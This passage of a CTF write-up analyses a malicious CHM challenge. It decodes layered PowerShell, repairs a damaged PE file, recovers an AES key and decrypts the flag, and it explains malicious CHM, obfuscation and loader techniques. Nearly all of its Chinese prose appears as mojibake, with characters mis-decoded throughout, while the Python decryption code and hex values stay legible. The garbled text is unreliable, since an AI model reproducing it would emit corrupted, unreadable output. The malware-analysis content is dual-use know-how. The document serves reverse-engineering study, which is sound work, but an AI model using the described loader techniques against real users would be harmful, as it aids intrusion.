**ç¬¬ä¸ƒä¸ªå…³é”®å‘ç°**ï¼šç¨‹åºåœ¨éªŒè¯ä»€ä¹ˆï¼Ÿ

é€šè¿‡é€»è¾‘åˆ†æï¼š
- ç¨‹åºä½¿ç”¨`v11`ä½œä¸ºå¯†é’¥è¿›è¡ŒAESæ“ä½œ
- æ“ä½œç»“æœå­˜å…¥`v10`
- ç„¶åæ£€æŸ¥`v10`æ˜¯å¦ç­‰äº`v12`
- å¦‚æœç›¸ç­‰ï¼Œè¯´æ˜**`v12`æ˜¯æŸä¸ªæ•°æ®ç”¨`v11`åŠ å¯†åçš„ç»“æœ**

**é€†å‘æ€è€ƒ**ï¼š
- å¦‚æœæˆ‘ä»¬ç”¨`v11`ä½œä¸ºå¯†é’¥**è§£å¯†**`v12`ï¼Œåº”è¯¥èƒ½å¾—åˆ°åŸå§‹æ•°æ®ï¼
- è¿™ä¸ªåŸå§‹æ•°æ®å¾ˆå¯èƒ½å°±æ˜¯flagï¼

#### 8.4 ç¡®å®šå¯†é’¥å’Œå¯†æ–‡

æ ¹æ®ç¨‹åºé€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥æ˜ç¡®ï¼š

**v11æ˜¯AESå¯†é’¥**ï¼š
- è¢«ä¼ å…¥`sub_1000113E`è¿›è¡Œå¯†é’¥æ‰©å±•
- AES-128å¯†é’¥é•¿åº¦ä¸º16å­—èŠ‚ï¼Œv11æ­£å¥½æ˜¯4ä¸ªintï¼ˆ16å­—èŠ‚ï¼‰

**v12æ˜¯å¯†æ–‡**ï¼š
- è¢«ç”¨æ¥ä¸åŠ å¯†ç»“æœæ¯”å¯¹
- è¯´æ˜v12æ˜¯é¢„å…ˆåŠ å¯†å¥½çš„æœŸæœ›å€¼
- è¦è·å–flagï¼Œéœ€è¦è§£å¯†v12

**æ•°æ®æå–**ï¼ˆéœ€è¦å¤„ç†å­—èŠ‚åºï¼‰ï¼š

```python
# IDAæ˜¾ç¤ºçš„æ˜¯æœ‰ç¬¦å·æ•´æ•°ï¼Œè½¬æ¢ä¸ºæ— ç¬¦å·16è¿›åˆ¶
v11 = [370507307, -1496142296, -2011826261, 1011863305]
v12 = [2043144735, -2097661099, -2141932719, 1974904527]

# è½¬æ¢ä¸ºæ— ç¬¦å·32ä½æ•´æ•°
v11_unsigned = [x & 0xFFFFFFFF for x in v11]
v12_unsigned = [x & 0xFFFFFFFF for x in v12]

# v11_unsigned = [0x16157E2B, 0xA6D2AE28, 0x8815F7AB, 0x3C4FCF09]
# v12_unsigned = [0x79C7EA1F, 0x82F83B55, 0x8054B351, 0x75B6A6CF]

# è½¬æ¢ä¸ºå°ç«¯åºå­—èŠ‚ï¼ˆx86æ˜¯å°ç«¯æ¶æ„ï¼‰
import struct
key_bytes = b''.join(struct.pack('<I', x) for x in v11_unsigned)
cipher_bytes = b''.join(struct.pack('<I', x) for x in v12_unsigned)

# key_bytes    = b'\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c'
# cipher_bytes = b'\x1f\xea\xc7\x79\x55\x3b\xf8\x82\x51\xb3\x54\x80\xcf\xa6\xb6\x75'
```

**æœ€ç»ˆç¡®è®¤**ï¼š

```
AES-128å¯†é’¥: 2b 7e 15 16 28 ae d2 a6 ab f7 15 88 09 cf 4f 3c
å¾…è§£å¯†å¯†æ–‡:  1f ea c7 79 55 3b f8 82 51 b3 54 80 cf a6 b6 75
```

**å…³é”®æ´å¯Ÿ**ï¼š
- ç¨‹åºæ²¡æœ‰ä»å¤–éƒ¨è¯»å–ä»»ä½•è¾“å…¥æ•°æ®
- æ‰€æœ‰æ•°æ®éƒ½ç¡¬ç¼–ç åœ¨æ ˆä¸Š
- è¿™è¯´æ˜flagå°±è—åœ¨è¿™ä¸¤ä¸ªæ•°æ®å—ä¸­
- `sub_1000125E`å¾ˆå¯èƒ½å®ç°çš„æ˜¯AESåŠ å¯†éªŒè¯ï¼Œæˆ‘ä»¬éœ€è¦åå‘è§£å¯†

### ç¬¬ä¹æ­¥ï¼šAESè§£å¯† - è·å–Flag

æ ¹æ®å¯¹`sub_10001000`å‡½æ•°çš„åˆ†æï¼Œæˆ‘ä»¬å·²ç»æ˜ç¡®ï¼š
- `v11`æ•°ç»„æ˜¯AES-128å¯†é’¥
- `v12`æ•°ç»„æ˜¯åŠ å¯†åçš„å¯†æ–‡
- éœ€è¦ä½¿ç”¨AES-ECBæ¨¡å¼è§£å¯†ï¼ˆå› ä¸ºåªæœ‰ä¸€ä¸ª16å­—èŠ‚å—ï¼Œä¸”æ²¡æœ‰çœ‹åˆ°IVåˆå§‹åŒ–ï¼‰

#### 9.1 ç¼–å†™è§£å¯†è„šæœ¬

```python
from Crypto.Cipher import AES
import struct

# ä»IDAä¼ªä»£ç ä¸­æå–çš„æ•´æ•°å€¼ï¼ˆæœ‰ç¬¦å·ï¼‰
v11 = [370507307, -1496142296, -2011826261, 1011863305]
v12 = [2043144735, -2097661099, -2141932719, 1974904527]

# è½¬æ¢ä¸ºæ— ç¬¦å·32ä½æ•´æ•°
v11_unsigned = [x & 0xFFFFFFFF for x in v11]
v12_unsigned = [x & 0xFFFFFFFF for x in v12]

# è½¬æ¢ä¸ºå°ç«¯åºå­—èŠ‚ï¼ˆx86æ¶æ„ï¼‰
key = b''.join(struct.pack('<I', x) for x in v11_unsigned)
ciphertext = b''.join(struct.pack('<I', x) for x in v12_unsigned)

print("å¯†é’¥ (hex):", key.hex())
print("å¯†æ–‡ (hex):", ciphertext.hex())

# ä½¿ç”¨AES-128 ECBæ¨¡å¼è§£å¯†
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)

print("\nè§£å¯†ç»“æœ (hex):", plaintext.hex())
print("è§£å¯†ç»“æœ (bytes):", plaintext)
print("Flag:", plaintext.decode('utf-8', errors='ignore'))
```

#### 9.2 è¿è¡Œç»“æœ

```
å¯†é’¥ (hex): 2b7e151628aed2a6abf7158809cf4f3c
å¯†æ–‡ (hex): 1feac779553bf88251b35480cfa6b675

è§£å¯†ç»“æœ (hex): 666c61677b746869736973697430317d
è§£å¯†ç»“æœ (bytes): b'flag{thisisit01}'
Flag: flag{thisisit01}
```

#### 9.3 éªŒè¯æ­£ç¡®æ€§

- âœ… è§£å¯†åå¾—åˆ°çš„16å­—èŠ‚æ­£å¥½æ˜¯ä¸€ä¸ªå®Œæ•´çš„flag
- âœ… æ ¼å¼ç¬¦åˆCTF flagæ ‡å‡†ï¼š`flag{...}`
- âœ… é•¿åº¦åˆšå¥½16å­—èŠ‚ï¼Œæ²¡æœ‰paddingï¼Œè¯´æ˜åŸå§‹æ•°æ®å°±æ˜¯16å­—èŠ‚
- âœ… åå…­è¿›åˆ¶`666c61677b...`å¯¹åº”ASCIIçš„"flag{"å¼€å¤´

**æˆåŠŸï¼** ğŸ‰

### ç¬¬åæ­¥ï¼šéªŒè¯ç­”æ¡ˆ

#### 10.1 æœ€ç»ˆFlag

```
flag{thisisit01}
```

#### 10.2 å®Œæ•´è§£å¯†è·¯å¾„

```
challenge (CHMæ–‡ä»¶)
    â†“ 7-Zipè§£å‹
doc.htm (åŒ…å«Base64ç¼–ç çš„PowerShell)
    â†“ Base64è§£ç  (UTF-16 LE)
PowerShellè„šæœ¬ (åŒ…å«Deflateå‹ç¼©æ•°æ®)
    â†“ Base64è§£ç  + Deflateè§£å‹
PowerShellè„šæœ¬ (è¯»å–"xxxxxxxx"åçš„æ•°æ®)
    â†“ ä»doc.chmæå–Base64
20201122.tmp (æŸåçš„PEæ–‡ä»¶)
    â†“ ä¿®å¤MZå¤´å’ŒPEåç§»
20201122_fixed.exe (æœ‰æ•ˆçš„PE DLL)
    â†“ IDAåˆ†æ + findcrypt
è¯†åˆ«AES-128 + æå–å¯†é’¥å’Œå¯†æ–‡
    â†“ AES-ECBè§£å¯†
flag{thisisit01}
```

---

## é”™è¯¯è·¯å¾„æ€»ç»“

åœ¨è§£é¢˜è¿‡ç¨‹ä¸­èµ°è¿‡çš„å¼¯è·¯ï¼š

### é”™è¯¯1: ç›´æ¥è¿è¡ŒPEæ–‡ä»¶
**é”™è¯¯æƒ³æ³•**: ä¿®å¤PEåç›´æ¥è¿è¡Œä¼šè¾“å‡ºflag
**çœŸç›¸**: è¿™æ˜¯ä¸€ä¸ªDLLï¼Œè€Œä¸”ä¸»è¦é€»è¾‘åœ¨æ•°æ®æ®µï¼Œè¿è¡Œä¸ä¼šæœ‰ä»»ä½•è¾“å‡º
**æ•™è®­**: é€†å‘é¢˜ç›®ä¸­ï¼Œé™æ€åˆ†æå¾€å¾€æ¯”åŠ¨æ€åˆ†ææ›´æœ‰æ•ˆ

### é”™è¯¯2: æœç´¢æ˜æ–‡"flag"
**é”™è¯¯æƒ³æ³•**: flagå¯èƒ½ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨
**çœŸç›¸**: flagç»è¿‡AESåŠ å¯†ï¼Œå¿…é¡»æ‰¾åˆ°å¯†é’¥æ‰èƒ½è§£å¯†
**æ•™è®­**: é¢˜ç›®åç§°"reverse_html"æš—ç¤ºé‡ç‚¹åœ¨HTMLï¼ˆCHMï¼‰å’Œé€†å‘ï¼Œä¸åœ¨æš´åŠ›æœç´¢

### é”™è¯¯3: å¿½ç•¥PowerShellè„šæœ¬çš„é€»è¾‘
**é”™è¯¯æƒ³æ³•**: è®¤ä¸ºPowerShellåªæ˜¯æ··æ·†ï¼Œæ²¡æœ‰å®é™…ä½œç”¨
**çœŸç›¸**: PowerShellè„šæœ¬æ¸…æ¥šåœ°è¯´æ˜äº†å¦‚ä½•æå–PEæ–‡ä»¶
**æ•™è®­**: æ··æ·†ä»£ç è™½ç„¶éš¾è¯»ï¼Œä½†å¾€å¾€åŒ…å«å…³é”®ä¿¡æ¯

### é”™è¯¯4: å°è¯•ç”¨é”™è¯¯çš„å¯†é’¥è§£å¯†
**é”™è¯¯æƒ³æ³•**: ä½¿ç”¨å¸¸è§æµ‹è¯•å¯†é’¥ï¼ˆå¦‚å…¨0ã€YELLOW SUBMARINEç­‰ï¼‰
**çœŸç›¸**: å¯†é’¥å°±åœ¨ä»£ç æ®µä¸­ï¼Œéœ€è¦ä»”ç»†åˆ†ææ±‡ç¼–ä»£ç 
**æ•™è®­**: CTFé¢˜ç›®çš„å¯†é’¥é€šå¸¸ä¸æ˜¯æ ‡å‡†å€¼ï¼Œéœ€è¦ä»ç¨‹åºä¸­æå–

---

## ç¨‹åºæ ¸å¿ƒæœºåˆ¶è¯¦è§£

### CHMæ–‡ä»¶æ ¼å¼

```
CHMæ–‡ä»¶ç»“æ„:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  CHM Header          â”‚ â† æ–‡ä»¶å¤´
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Directory Header    â”‚ â† ç›®å½•ä¿¡æ¯
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Directory Entries   â”‚ â† æ–‡ä»¶åˆ—è¡¨
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  LZXC Compressed     â”‚ â† å‹ç¼©çš„å†…å®¹
â”‚  Data (HTML/Images)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ¶æ„CHMç‰¹å¾:
- OBJECTæ ‡ç­¾ä½¿ç”¨å±é™©classid
- æ‰§è¡ŒPowerShellæˆ–å…¶ä»–å‘½ä»¤
- å‚æ•°ç»è¿‡å¤šå±‚ç¼–ç æ··æ·†
```

### PowerShellæ··æ·†æŠ€æœ¯

```
ç¼–ç å±‚æ¬¡:
åŸå§‹PowerShellä»£ç 
    â†“ UTF-16 LEç¼–ç 
äºŒè¿›åˆ¶æ•°æ®
    â†“ Base64ç¼–ç 
æ–‡æœ¬å­—ç¬¦ä¸² (ç”¨äº-eå‚æ•°)

è§£å‹å±‚æ¬¡:
Base64å­—ç¬¦ä¸²
    â†“ Base64è§£ç 
Deflateå‹ç¼©æ•°æ®
    â†“ zlib.decompress(-zlib.MAX_WBITS)
PowerShellä»£ç 
```

### AES-128åŠ å¯†

```
AES-128åŠ å¯†å‚æ•°:
- å¯†é’¥é•¿åº¦: 128ä½ (16å­—èŠ‚)
- åŠ å¯†æ¨¡å¼: ECB (æœ€ç®€å•çš„æ¨¡å¼)
- è½®æ•°: 10è½®
- å—å¤§å°: 128ä½ (16å­—èŠ‚)

æ ‡è¯†ç‰¹å¾:
1. S-box: ä»¥0x63å¼€å¤´çš„256å­—èŠ‚è¡¨
2. åˆå§‹åŒ–å‘é‡: å›ºå®šçš„magic numbers
3. è½®å¸¸æ•°: Rconè¡¨
4. 10è½®è¿­ä»£ç»“æ„
```

### PEæ–‡ä»¶ä¿®å¤

```
æŸåä½ç½®:
0x00: 0x90 0x00     (åº”è¯¥æ˜¯ 0x4D 0x5A = "MZ")
0x3C: 0xE0 0x0F ... (é”™è¯¯çš„PEåç§»)

ä¿®å¤æ–¹æ³•:
1. æœç´¢"PE\x00\x00"æ‰¾åˆ°çœŸæ­£çš„PEå¤´ä½ç½®
2. ä¿®å¤DOSç­¾åä¸º"MZ"
3. æ›´æ–°0x3Cå¤„çš„PEåç§»æŒ‡é’ˆ
4. éªŒè¯PEç»“æ„å®Œæ•´æ€§
```

---

## æŠ€æœ¯æ€»ç»“

### æ ¸å¿ƒæŠ€æœ¯ç‚¹

1. **CHMæ–‡ä»¶åˆ†æ** â­â­â­â­
   - ä½¿ç”¨7-Zipç­‰å·¥å…·è§£å‹CHM
   - è¯†åˆ«æ¶æ„OBJECTæ ‡ç­¾
   - ç†è§£classidçš„ä½œç”¨

2. **PowerShellè§£ç ** â­â­â­â­â­
   - UTF-16 LEç¼–ç è¯†åˆ«
   - Base64å¤šå±‚è§£ç 
   - Deflateè§£å‹ç¼©ï¼ˆraw deflateï¼‰
   - ç†è§£`-e`å‚æ•°çš„å«ä¹‰

3. **PEæ–‡ä»¶ä¿®å¤** â­â­â­â­
   - DOSå¤´ç»“æ„ç†è§£
   - PEå¤´å®šä½æ–¹æ³•
   - æ–‡ä»¶å¤´ä¿®å¤æŠ€æœ¯

4. **ä»£ç æ··æ·†æŠ€æœ¯** â­â­â­â­â­
   - **æ•°æ®ä¼ªè£…æˆä»£ç **: å°†æœºå™¨ç å­˜å‚¨ä¸ºæ•°æ®æ®µï¼ˆ`dword_10001000`ï¼‰
   - **åŠ¨æ€ä»£ç æ‰§è¡Œ**: é€šè¿‡`call eax`å°†æ•°æ®å½“ä½œä»£ç æ‰§è¡Œ
   - **ååæ±‡ç¼–æŠ€æœ¯**: IDAé»˜è®¤æ— æ³•è¯†åˆ«ï¼Œéœ€è¦æ‰‹åŠ¨è½¬æ¢ï¼ˆæŒ‰`C`é”®ï¼‰
   - **æ··æ·†æŒ‡ä»¤**: åŒ…å«åƒåœ¾æŒ‡ä»¤ï¼ˆå¦‚`in al, dx`ï¼‰å¹²æ‰°åˆ†æ
   - **Stack Canary**: ä½¿ç”¨Cookieä¿æŠ¤æ ˆï¼Œå¢åŠ è°ƒè¯•éš¾åº¦
   - **ç›®çš„**: éšè—å…³é”®çš„å¯†é’¥å’Œå¯†æ–‡åˆå§‹åŒ–ä»£ç 

5. **AESåŠ å¯†è¯†åˆ«** â­â­â­â­â­
   - ä½¿ç”¨findcryptæ’ä»¶
   - S-boxç‰¹å¾è¯†åˆ«
   - å¯†é’¥å’Œå¯†æ–‡å®šä½
   - ECBæ¨¡å¼è§£å¯†

### éš¾ç‚¹çªç ´

1. **å¤šå±‚ç¼–ç æ··æ·†** â­â­â­â­â­
   - æœ€å¤§éš¾ç‚¹ï¼šè¯†åˆ«æ¯ä¸€å±‚çš„ç¼–ç æ–¹å¼
   - çªç ´æ–¹æ³•ï¼šé€å±‚åˆ†æï¼Œä½¿ç”¨æ­£ç¡®çš„è§£ç å·¥å…·

2. **PEæ–‡ä»¶æŸå** â­â­â­â­
   - éš¾ç‚¹ï¼šæ–‡ä»¶æ— æ³•è¢«å·¥å…·ç›´æ¥è¯†åˆ«
   - çªç ´æ–¹æ³•ï¼šæ‰‹åŠ¨æœç´¢PEç­¾åï¼Œä¿®å¤æ–‡ä»¶å¤´

3. **AESå¯†é’¥å®šä½** â­â­â­â­â­
   - éš¾ç‚¹ï¼šå¯†é’¥å’Œå¯†æ–‡æ··åœ¨ä»£ç ä¸­
   - çªç ´æ–¹æ³•ï¼šåˆ†ææ±‡ç¼–ä»£ç ï¼Œç†è§£æ•°æ®åˆå§‹åŒ–è¿‡ç¨‹

4. **å·¥å…·é“¾ä½¿ç”¨** â­â­â­
   - éš¾ç‚¹ï¼šéœ€è¦ä½¿ç”¨å¤šç§å·¥å…·é…åˆ
   - çªç ´æ–¹æ³•ï¼šç†Ÿæ‚‰7-Zipã€Pythonã€IDAã€findcryptç­‰å·¥å…·

### å­¦åˆ°çš„ç»éªŒ

1. **åˆ†å±‚å‰¥ç¦»æ€æƒ³**
   - å¤æ‚é—®é¢˜è¦é€å±‚åˆ†è§£
   - æ¯è§£å†³ä¸€å±‚ï¼Œè®°å½•ä¸­é—´ç»“æœ
   - ä¸è¦è¯•å›¾ä¸€æ¬¡æ€§è§£å†³æ‰€æœ‰é—®é¢˜

2. **å·¥å…·æ˜¯é€†å‘çš„å¥½å¸®æ‰‹**
   - findcryptæ’ä»¶å¤§å¤§ç®€åŒ–äº†åŠ å¯†ç®—æ³•è¯†åˆ«
   - 7-Zipæ˜¯åˆ†ææ–‡ä»¶æ ¼å¼çš„åˆ©å™¨
   - Pythonæ˜¯å¿«é€ŸéªŒè¯æƒ³æ³•çš„æœ€ä½³é€‰æ‹©

3. **ä»£ç æ³¨é‡Šçš„é‡è¦æ€§**
   - PowerShellæ³¨é‡Šæš—ç¤ºäº†ä¸‹è½½æ¶æ„æ–‡ä»¶çš„å®Œæ•´æµç¨‹
   - è™½ç„¶è¢«æ³¨é‡Šæ‰ï¼Œä½†æ­ç¤ºäº†æ”»å‡»è€…çš„æ„å›¾

4. **ç»†èŠ‚å†³å®šæˆè´¥**
   - è¯†åˆ«UTF-16 LE vs UTF-8
   - ä½¿ç”¨raw deflate vs æ ‡å‡†zlib
   - ä¿®å¤PEåç§»çš„ä½ç½®ï¼ˆ0x3Cï¼‰

---

## è§£é¢˜è„šæœ¬ä½¿ç”¨

### å®Œæ•´è§£é¢˜æµç¨‹ï¼ˆæ¨èï¼‰

```bash
# 1. è§£å‹CHMæ–‡ä»¶
7z x challenge -ochallenge~

# 2. æå–å¹¶è§£ç PowerShell
python extract_powershell.py

# 3. ä»CHMæå–PEæ–‡ä»¶
python extract_pe_from_chm.py

# 4. ä¿®å¤PEæ–‡ä»¶
python fix_pe.py

# 5. ä½¿ç”¨IDAåˆ†æï¼ˆæ‰‹åŠ¨ï¼‰
# - æ‰“å¼€20201122_fixed.exe
# - è¿è¡Œfindcryptæ’ä»¶
# - å®šä½å¯†é’¥å’Œå¯†æ–‡

# 6. AESè§£å¯†
python decrypt_with_found_data.py
```

### ç‹¬ç«‹è„šæœ¬

```bash
# æ–¹æ³•1: ä½¿ç”¨Pythonå®Œæ•´è§£å†³
python solve_reverse_html.py

# æ–¹æ³•2: é€æ­¥æ‰§è¡Œ
python get_flag.py        # è§£ç PowerShell
python fix_pe.py          # ä¿®å¤PE
python decrypt_with_found_data.py  # è§£å¯†
```

---

## æœ€ç»ˆç­”æ¡ˆ

### Flag
```
flag{thisisit01}
```

### å…³é”®æ•°æ®

```
CHMæ–‡ä»¶: challenge (26786å­—èŠ‚)
PowerShell (Base64, UTF-16 LE): ~4000å­—ç¬¦
PowerShell (Deflateå‹ç¼©): ~700å­—èŠ‚
"xxxxxxxx"æ ‡è®°ä½ç½®: 0x3767 (14183)
PEæ–‡ä»¶åŸå§‹: 20201122.tmp (9214å­—èŠ‚)
PEæ–‡ä»¶ä¿®å¤: 20201122_fixed.exe (9214å­—èŠ‚)

AES-128å¯†é’¥: 2b7e151628aed2a6abf7158809cf4f3c
åŠ å¯†æ•°æ®:   1feac779553bf88251b35480cfa6b675
è§£å¯†ç»“æœ:   flag{thisisit01}
```

---

## å·¥å…·å’Œç¯å¢ƒ

- **7-Zip**: CHMæ–‡ä»¶è§£å‹
- **IDA Pro 7.x**: é™æ€åˆ†æå’Œåç¼–è¯‘
- **findcryptæ’ä»¶**: åŠ å¯†ç®—æ³•è¯†åˆ«
- **Python 3.8+**: ç¼–å†™è§£å¯†è„šæœ¬
- **pycryptodome**: AESè§£å¯†åº“

---

## ä½œè€…æ³¨

è¿™é“é¢˜çš„è®¾è®¡ä½“ç°äº†çœŸå®ç½‘ç»œæ”»å‡»çš„å¤šä¸ªé˜¶æ®µï¼š

1. **åˆå§‹æŠ•é€’**: CHMæ–‡ä»¶ä½œä¸ºè½½ä½“ï¼ˆç±»ä¼¼é’“é±¼é‚®ä»¶é™„ä»¶ï¼‰
2. **ä»£ç æ··æ·†**: å¤šå±‚ç¼–ç éšè—çœŸå®æ„å›¾
3. **è½½è·ä¸‹è½½**: PowerShellè„šæœ¬å°è¯•ä¸‹è½½æ¶æ„æ–‡ä»¶
4. **æŒä¹…åŒ–**: è§£å¯†å‡ºçš„PEå¯èƒ½ç”¨äºåç»­æ”»å‡»

ä»CTFè§’åº¦ï¼Œè¿™é“é¢˜è€ƒå¯Ÿäº†ï¼š
- æ–‡ä»¶æ ¼å¼åˆ†æèƒ½åŠ›
- ç¼–ç è¯†åˆ«å’Œè½¬æ¢
- äºŒè¿›åˆ¶æ–‡ä»¶ä¿®å¤
- å¯†ç å­¦åŸºç¡€
- å·¥å…·é“¾ä½¿ç”¨

æœ€å…³é”®çš„çªç ´ç‚¹æœ‰ä¸‰ä¸ªï¼š
1. **è¯†åˆ«å¤šå±‚ç¼–ç ** - éœ€è¦è€å¿ƒå’Œç»†å¿ƒ
2. **ä¿®å¤PEæ–‡ä»¶** - éœ€è¦å¯¹PEæ ¼å¼æœ‰æ·±å…¥ç†è§£  
3. **å®šä½AESå¯†é’¥** - éœ€è¦ä»”ç»†é˜…è¯»æ±‡ç¼–ä»£ç 

è§£é¢˜è¿‡ç¨‹å±•ç¤ºäº†é€†å‘å·¥ç¨‹çš„å…¸å‹å·¥ä½œæµç¨‹ï¼š**è¯†åˆ«â†’æå–â†’ä¿®å¤â†’åˆ†æâ†’è§£å¯†**ã€‚æ¯ä¸€æ­¥éƒ½éœ€è¦åˆé€‚çš„å·¥å…·å’ŒæŠ€æœ¯ï¼Œè¿™æ­£æ˜¯é€†å‘å·¥ç¨‹çš„é­…åŠ›æ‰€åœ¨ã€‚

å¸Œæœ›è¿™ä»½è¯¦ç»†çš„è§£é¢˜æŠ¥å‘Šèƒ½å¸®åŠ©ä½ ç†è§£æ•´ä¸ªæ€è·¯è¿‡ç¨‹ã€‚**æ€è·¯å’Œæ–¹æ³•æ¯”ç­”æ¡ˆæ›´é‡è¦ï¼**

---

## æ–‡ä»¶æ¸…å•

### ä¸»è¦æ–‡ä»¶
- `README.md` - å®Œæ•´è§£é¢˜æŠ¥å‘Šï¼ˆæœ¬æ–‡æ¡£ï¼‰
- `challenge` - åŸå§‹CHMæ–‡ä»¶
- `20201122_fixed.exe` - ä¿®å¤åçš„PEæ–‡ä»¶

### Pythonè„šæœ¬
- `get_flag.py` - PowerShellè§£ç è„šæœ¬
- `fix_pe.py` - PEæ–‡ä»¶ä¿®å¤è„šæœ¬
- `decrypt_with_found_data.py` - AESè§£å¯†è„šæœ¬ï¼ˆæœ€ç»ˆç­”æ¡ˆï¼‰
- `solve_reverse_html.py` - å®Œæ•´è§£é¢˜è„šæœ¬

### åˆ†ææ–‡æ¡£
- `è§£é¢˜æ€è·¯.md` - åˆæ­¥åˆ†æè®°å½•
- `PowerShellå‘½ä»¤è¯¦è§£.md` - PowerShellæ··æ·†åˆ†æ

### ä¸­é—´æ–‡ä»¶
- `challenge~/` - CHMè§£å‹ç›®å½•
- `doc.htm` - åŒ…å«æ¶æ„ä»£ç çš„HTML
- `20201122.tmp` - æŸåçš„PEæ–‡ä»¶
- `FLAG.txt` - è§£ç åçš„PowerShellè„šæœ¬